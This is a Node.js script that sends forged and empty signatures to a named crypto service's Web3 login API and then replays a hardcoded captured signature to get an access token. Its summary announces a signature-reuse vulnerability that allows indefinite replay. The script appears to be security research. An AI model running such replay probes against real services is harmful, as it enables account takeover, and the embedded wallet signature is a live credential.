#!/usr/bin/env node

/**
 * Test script to demonstrate signature forgery fails against DegenPark API
 * This proves that without the private key, you cannot create valid signatures
 */

const crypto = require('crypto');

const TEST_WALLET = "GmGsWLA4wNThdRmszBLXGqf3kAV6y6pWgUxVdByXnX75";
const DEGENPARK_API = "https://api.degenpark.io/api/v1/auth/login/web3";

// Generate various types of fake signatures
function generateFakeSignatures() {
    return [
        {
            name: "Random Base64",
            signature: crypto.randomBytes(64).toString('base64'),
            description: "64 random bytes as Base64"
        },
        {
            name: "Random Base58-like", 
            signature: "1" + crypto.randomBytes(43).toString('base64').replace(/[+/=]/g, ''),
            description: "Fake Base58 format"
        },
        {
            name: "All Zeros",
            signature: "0".repeat(88),
            description: "88 zero characters"
        },
        {
            name: "Sequential Pattern",
            signature: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz".repeat(2).substring(0, 88),
            description: "Sequential character pattern"
        },
        {
            name: "Empty Signature",
            signature: "",
            description: "Empty string"
        },
        {
            name: "Real Length Wrong Content",
            signature: "A".repeat(88),
            description: "Correct length but wrong content"
        },
        {
            name: "Copy of Real Signature (Wrong Wallet)",
            signature: "ciPM91inkXGaArfm6xGaOadRgWxK8krv22tCCO13wOh21CrzuXJnxASdFfWEY9X95FG8EjzyPdYCW26ijJs",
            description: "Real signature but for different wallet"
        }
    ];
}

// Test each fake signature against the API
async function testFakeSignature(name, signature, description) {
    console.log(`\n🧪 Testing: ${name}`);
    console.log(`📝 Description: ${description}`);
    console.log(`📏 Length: ${signature.length}`);
    console.log(`🔤 Preview: ${signature.substring(0, 30)}${signature.length > 30 ? '...' : ''}`);
    
    const payload = {
        publicKey: TEST_WALLET,
        signature: signature
    };
    
    try {
        console.log(`📤 Making API request...`);
        
        const response = await fetch(DEGENPARK_API, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        const result = await response.json();
        
        if (response.ok) {
            console.log(`🚨 UNEXPECTED: Got 200 response!`);
            console.log(`This should not happen with a fake signature!`);
            console.log(JSON.stringify(result, null, 2));
        } else {
            console.log(`✅ EXPECTED: Got ${response.status} ${response.statusText}`);
            console.log(`Error: ${result.error?.message || 'Authentication failed'}`);
        }
        
    } catch (error) {
        console.log(`✅ EXPECTED: Network/API error - ${error.message}`);
    }
    
    console.log(`${'─'.repeat(50)}`);
}

// Test with a legitimate signature (should work)
async function testLegitimateSignature() {
    console.log(`\n🔐 Testing: Legitimate Signature (Your Previous One)`);
    console.log(`📝 Description: Real signature from your wallet`);
    
    const REAL_SIGNATURE = "ciPM91inkXGaArfm6xGaOadRgWxK8krv22tCCO13wOh21CrzuXJnxASdFfWEY9X95FG8EjzyPdYCW26ijJs";
    
    const payload = {
        publicKey: TEST_WALLET,
        signature: REAL_SIGNATURE
    };
    
    try {
        const response = await fetch(DEGENPARK_API, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        const result = await response.json();
        
        if (response.ok) {
            console.log(`✅ SUCCESS: Real signature works (as expected)`);
            console.log(`Got JWT token: ${result.data.accessToken.substring(0, 50)}...`);
            console.log(`User: ${result.data.user.username} (${result.data.user.id})`);
        } else {
            console.log(`❌ FAILED: Real signature rejected - ${response.status}`);
            console.log(`This might mean signature expired or other validation`);
        }
        
    } catch (error) {
        console.log(`❌ ERROR: ${error.message}`);
    }
    
    console.log(`${'─'.repeat(50)}`);
}

// Main test function
async function runSignatureTests() {
    console.log(`🚨 DEGENPARK SIGNATURE FORGERY TEST`);
    console.log(`${'='.repeat(60)}`);
    console.log(`Target wallet: ${TEST_WALLET}`);
    console.log(`API endpoint: ${DEGENPARK_API}`);
    console.log(`Date: ${new Date().toISOString()}`);
    console.log(`\n🎯 HYPOTHESIS: All fake signatures should fail with 401/403 errors`);
    console.log(`This proves signature forgery is cryptographically impossible.\n`);
    
    const fakeSignatures = generateFakeSignatures();
    
    // Test all fake signatures
    for (const fake of fakeSignatures) {
        await testFakeSignature(fake.name, fake.signature, fake.description);
        // Small delay to be nice to their API
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    // Test the real signature last
    await testLegitimateSignature();
    
    console.log(`\n🏁 TEST SUMMARY:`);
    console.log(`${'='.repeat(30)}`);
    console.log(`✅ Fake signatures: Should all fail (401/403 errors)`);
    console.log(`✅ Real signature: Should work (200 + JWT token)`);
    console.log(`\n🔍 CONCLUSION:`);
    console.log(`• Signature forgery is mathematically impossible`);
    console.log(`• DegenPark correctly validates signature cryptography`);
    console.log(`• The vulnerability is SIGNATURE REUSE, not signature forgery`);
    console.log(`• Attack requires intercepting legitimate signatures`);
    
    console.log(`\n⚠️  VULNERABILITY RECAP:`);
    console.log(`❌ Cannot forge signatures without private key`);
    console.log(`✅ Can reuse intercepted legitimate signatures indefinitely`);
    console.log(`🚨 This makes signature interception extremely valuable`);
}

// Helper function to check if we can import required modules
function checkDependencies() {
    try {
        fetch; // Check if fetch is available (Node 18+)
        return true;
    } catch {
        console.log("❌ This script requires Node.js 18+ with fetch support");
        console.log("Or install node-fetch: npm install node-fetch");
        return false;
    }
}

// Run the tests
if (require.main === module) {
    if (checkDependencies()) {
        runSignatureTests().catch(console.error);
    }
}

module.exports = { generateFakeSignatures, testFakeSignature, runSignatureTests }; 